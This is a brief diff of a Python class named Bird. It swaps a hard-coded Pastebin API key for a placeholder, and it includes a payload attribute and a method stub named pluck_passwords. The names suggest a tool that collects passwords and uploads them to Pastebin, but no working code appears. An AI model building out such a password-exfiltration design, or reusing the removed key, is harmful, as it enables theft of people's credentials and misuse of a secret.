@@ -7,7 +7,7 @@ from shutil import copy
 class Bird:
 
 
-	pastebin_key = '6fa308892fe32aad6568444477f63761'
+	pastebin_key = 'PASTEBIN API KEY'
 	payload = ''
 
 	def pluck_passwords(self):
